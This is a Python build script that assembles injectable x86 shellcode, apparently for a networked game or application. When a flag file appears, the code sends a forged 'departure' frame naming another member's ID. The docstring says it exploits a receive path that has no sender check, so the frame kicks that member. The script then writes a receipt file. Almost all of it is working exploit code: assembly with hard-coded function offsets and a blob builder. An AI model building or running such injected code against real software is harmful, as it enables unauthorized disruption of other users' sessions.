"""P61: D8 (departure) frame sender agent — targeted-kick experiment build.

The wire is the P34 vector: BE32(8) + BE32(departing_id), submitted through the
reliable channel 4c80/4b60. The D8 receive path (0x10003dc6 -> 0x10003fd0) has
no sender check (static), so a DLL member may be able to retire another member.
One shot, then a receipt; the agent never retries.
"""
from __future__ import annotations

import struct
import sys

BLOB_SIZE = 0x200
MAGIC = 0x31473844          # 'D8G1'
RECEIPT_MAGIC = 0x31473844
RECEIPT_SIZE = 64

BLOB_LAYOUT = (
    ('magic', 0x00), ('done', 0x04),
    ('GetFileAttributesA', 0x08), ('CreateFileA', 0x0C), ('WriteFileA', 0x10),
    ('CloseHandle', 0x14), ('Sleep', 0x18), ('GetTickCount', 0x1C),
    ('send4b60', 0x20), ('gethost4c80', 0x24), ('netobj', 0x28), ('departing', 0x2C),
)
FLAG_PATH_OFF = 0x48
RECEIPT_PATH_OFF = 0xC8

AGENT_ASM = r"""
.intel_syntax noprefix
.text
.globl agent_start
agent_start:
    push esi
    push ebx
    push edi
    sub esp, 0x160
    mov esi, [esp+0x170]
    cmp dword ptr [esi], 0x31473844
    jne d_spin
d_loop:
    cmp dword ptr [esi+4], 0
    jne d_sleep_long
    lea eax, [esi+0x48]
    push eax
    call dword ptr [esi+0x08]
    cmp eax, -1
    je d_sleep_short
    mov dword ptr [esp+0x00], 0x08000000
    mov eax, [esi+0x2C]
    bswap eax
    mov [esp+0x04], eax
    mov ebx, [esi+0x28]
    push ebx
    call dword ptr [esi+0x24]
    add esp, 4
    push 8
    lea ecx, [esp+0x04]
    push ecx
    push eax
    push ebx
    call dword ptr [esi+0x20]
    add esp, 16
    mov dword ptr [esi+4], 1
    mov dword ptr [esp+0x110], 0x31473844
    mov [esp+0x114], eax
    mov eax, [esi+0x2C]
    mov [esp+0x118], eax
    mov eax, [esi+0x28]
    mov [esp+0x11C], eax
    call dword ptr [esi+0x1C]
    mov [esp+0x120], eax
    lea eax, [esi+0xC8]
    push 0
    push 128
    push 2
    push 0
    push 3
    push 0x40000000
    push eax
    call dword ptr [esi+0x0C]
    cmp eax, -1
    je d_after_receipt
    mov [esp+0x150], eax
    push 0
    lea eax, [esp+0x158]
    push eax
    push 64
    lea eax, [esp+0x11C]
    push eax
    mov eax, [esp+0x160]
    push eax
    call dword ptr [esi+0x10]
    push 0
    mov eax, [esp+0x154]
    push eax
    call dword ptr [esi+0x14]
d_after_receipt:
    push 1000
    call dword ptr [esi+0x18]
    jmp d_loop
d_sleep_short:
    push 250
    call dword ptr [esi+0x18]
    jmp d_loop
d_sleep_long:
    push 1000
    call dword ptr [esi+0x18]
    jmp d_loop
d_spin:
    push 5000
    call dword ptr [esi+0x18]
    jmp d_spin
.att_syntax prefix
"""


def build_blob(pointers, *, netobj, departing, flag_path, receipt_path):
    blob = bytearray(BLOB_SIZE)
    def put32(off, val):
        struct.pack_into('<I', blob, off, val & 0xFFFFFFFF)
    put32(0x00, MAGIC)
    put32(0x04, 0)
    for name, off in BLOB_LAYOUT[2:]:
        value = {'send4b60': pointers['send4b60'], 'gethost4c80': pointers['gethost4c80'],
                 'netobj': netobj, 'departing': departing}.get(name, pointers.get(name))
        if value is None:
            raise SystemExit('missing pointer %s' % name)
        put32(off, value)
    blob[FLAG_PATH_OFF:FLAG_PATH_OFF + len(flag_path) + 1] = flag_path.encode('ascii') + b'\x00'
    blob[RECEIPT_PATH_OFF:RECEIPT_PATH_OFF + len(receipt_path) + 1] = receipt_path.encode('ascii') + b'\x00'
    return bytes(blob)


def main():
    import argparse
    import json
    from pathlib import Path
    ap = argparse.ArgumentParser()
    ap.add_argument('--outdir', default='.')
    args = ap.parse_args()
    from p60_generic_cmd_build import assemble
    import tempfile
    with tempfile.TemporaryDirectory() as tmp:
        code = assemble(AGENT_ASM, 'agent_d8', Path(tmp))
    out = Path(args.outdir)
    (out / 'agent_d8.bin').write_bytes(code)
    (out / 'agent_d8.s').write_text(AGENT_ASM, encoding='utf-8')
    import hashlib
    print(json.dumps({'ok': True, 'size': len(code),
                      'sha256': hashlib.sha256(code).hexdigest()}))


if __name__ == '__main__':
    main()
